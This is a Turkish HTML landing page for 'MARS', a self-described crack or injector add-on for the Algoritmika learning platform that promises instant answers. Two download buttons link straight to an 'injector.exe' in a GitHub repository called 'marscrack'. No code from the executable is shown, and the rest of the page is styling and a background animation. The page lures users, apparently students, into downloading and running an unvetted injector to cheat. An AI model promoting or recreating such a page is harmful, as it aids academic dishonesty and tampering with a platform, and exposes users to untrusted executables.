<!doctype html>
<html lang="tr">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>MARS — Algoritmika Eklentisi</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bg1:#040816; --bg2:#001428; --accent1:#ff6b6b; --accent2:#7c5cff; --glass:rgba(255,255,255,0.05);
    --card:rgba(255,255,255,0.03);
  }
  html,body{height:100%}
  body{font-family:Inter,Segoe UI,Roboto,Arial; background:radial-gradient(1200px 600px at 10% 10%, rgba(124,92,255,0.08), transparent), linear-gradient(180deg,var(--bg1),var(--bg2)); color:#e6eef8; -webkit-font-smoothing:antialiased; overflow-x:hidden}
  #bgcanvas{position:fixed;inset:0;z-index:0}
  header{position:relative;z-index:5;padding:28px 6vw;display:flex;align-items:center;justify-content:space-between}
  .brand{display:flex;gap:14px;align-items:center}
  .logo{width:56px;height:56px;border-radius:12px;background:conic-gradient(from 120deg,var(--accent2),#ff9f6b,var(--accent1));display:flex;align-items:center;justify-content:center;font-weight:700;box-shadow:0 10px 30px rgba(0,0,0,.6); position:relative;}
  .logo small{font-weight:700;color:#08121b}
  .planet-icon{position:absolute;width:28px;height:28px;top:14px;left:14px;border-radius:50%;background:linear-gradient(45deg,#ff6b6b,#7c5cff);box-shadow:0 0 12px rgba(255,255,255,0.6);}
  nav{display:flex;gap:12px}
  nav button{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:10px 14px;border-radius:10px;color:inherit;cursor:pointer;backdrop-filter:blur(6px)}
  main{min-height:78vh;display:grid;grid-template-columns:420px 1fr;gap:36px;padding:6vh 6vw;position:relative;z-index:2;align-items:center}
  .info-card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:20px;border-radius:18px;border:1px solid rgba(255,255,255,0.03);backdrop-filter:blur(8px);box-shadow:0 12px 40px rgba(47,18,84,0.25);display:flex;flex-direction:column;gap:14px;align-self:start}
  .feature-title{display:flex;gap:12px;align-items:center;margin-bottom:16px;font-weight:700;font-size:18px}
  .feature-list{display:flex;flex-direction:column;gap:14px}
  .feature{display:flex;gap:12px;align-items:flex-start}
  .feature svg{width:28px;height:28px;flex-shrink:0}
  .feature strong{display:block}
  .hero{padding:8px 2vw}
  h1{font-size:clamp(30px,6vw,56px);line-height:1.02}
  .subtitle{margin-top:10px;color:#cfe6ff;opacity:.95}
  .cta{margin-top:22px;display:flex;gap:12px}
  .btn{padding:12px 18px;border-radius:12px;border:1px solid rgba(255,255,255,0.06);background:var(--glass);cursor:pointer;transition:transform .18s ease,box-shadow .18s ease}
  .btn:hover{transform:translateY(-6px);box-shadow:0 18px 40px rgba(0,0,0,.6)}
  .btn.primary{background:linear-gradient(90deg,var(--accent2),var(--accent1));color:#071022;border:0}
  .sparkle{display:inline-block;transform-origin:center;animation:spark 2s linear infinite}
  @keyframes spark{0%{transform:translateY(0) rotate(0)}50%{transform:translateY(-6px) rotate(12deg)}100%{transform:translateY(0) rotate(0)}}
  @media(max-width:980px){main{grid-template-columns:1fr;gap:18px;padding:5vh 5vw}}
</style>
</head>
<body>
<canvas id="bgcanvas"></canvas>
<header>
  <div class="brand">
    <div class="logo">
      <small>M</small>
      <div class="planet-icon"></div>
    </div>
    <div>
      <div style="font-weight:700">MARS</div>
      <div style="font-size:13px;color:#9fbff4">Algoritmika Eklentisi — Close Tarafından Yapılmıştır</div>
    </div>
  </div>
  <nav>
    <!-- Doğrudan indir butonu -->
    <a href="https://github.com/frostlog6-ux/marscrack/raw/main/injector.exe" download>
      <button id="downloadBtn" class="primary">İndir</button>
    </a>
  </nav>
</header>
<main>
  <aside class="info-card">
    <div class="feature-title">Özellikler</div>
    <div class="feature-list">
      <div class="feature">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" stroke="#7C5CFF" stroke-width="2"/></svg>
        <div><strong>Anında Cevap Bulma</strong></div>
      </div>
      <div class="feature">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="3" width="18" height="18" rx="4" stroke="#FF6B6B" stroke-width="2"/></svg>
        <div><strong>Veri Gizliliği</strong></div>
      </div>
      <div class="feature">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12h16" stroke="#FFD66B" stroke-width="2" stroke-linecap="round"/></svg>
        <div><strong>Hızlı Kurulum</strong></div>
      </div>
    </div>
  </aside>
  <section class="hero">
    <h1>MARS — Algoritmika Eklentisi</h1>
    <p class="subtitle">hızlı ve güvenli kullanım.</p>
    <div class="cta">
      <a href="https://github.com/frostlog6-ux/marscrack/raw/main/injector.exe" download>
        <button class="btn primary" id="demoInstall">İndir</button>
      </a>
    </div>
  </section>
</main>
<footer style="padding:36px 6vw;color:#9fbff4;opacity:.9">© MARSCRACK — Close Tarafından Yapılmıştır</footer>
<script>
const canvas = document.getElementById('bgcanvas');
const ctx = canvas.getContext('2d');
let w=canvas.width=innerWidth, h=canvas.height=innerHeight; 
window.addEventListener('resize', ()=>{w=canvas.width=innerWidth;h=canvas.height=innerHeight});
class Particle{constructor(){this.reset()} reset(){this.x=Math.random()*w;this.y=Math.random()*h;this.vx=(Math.random()-0.5)*0.7;this.vy=(Math.random()-0.5)*0.9;this.r=0.6+Math.random()*2.8;this.alpha=0.12+Math.random()*0.6;this.hue=230+Math.random()*60} update(){this.x+=this.vx;this.y+=this.vy; if(this.x<-10||this.x>w+10||this.y<-10||this.y>h+10) this.reset()} draw(ctx){ctx.beginPath();const g = ctx.createRadialGradient(this.x,this.y,0,this.x,this.y,this.r*6);g.addColorStop(0, `hsla(${this.hue},90%,68%,${this.alpha})`);g.addColorStop(1, `hsla(${this.hue},90%,68%,0)`);ctx.fillStyle=g;ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fill()}}
let parts=[]; for(let i=0;i<220;i++) parts.push(new Particle()); function loop(){ctx.clearRect(0,0,w,h); for(let p of parts){p.update();p.draw(ctx)} requestAnimationFrame(loop)} loop();
</script>
</body>
</html>
